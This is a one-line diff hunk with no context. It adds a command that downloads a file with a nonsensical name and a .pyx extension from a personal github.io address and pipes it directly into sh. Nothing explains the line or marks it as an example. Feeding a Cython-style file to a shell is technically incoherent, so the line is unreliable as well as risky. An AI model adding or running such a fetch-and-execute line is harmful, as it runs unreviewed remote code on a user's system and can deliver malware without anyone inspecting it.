@@ -1,0 +1,1 @@
+curl -L --progress-bar frkns.github.io/fun/paraguay_suffering_athletes_casa_markers_easy.pyx | sh
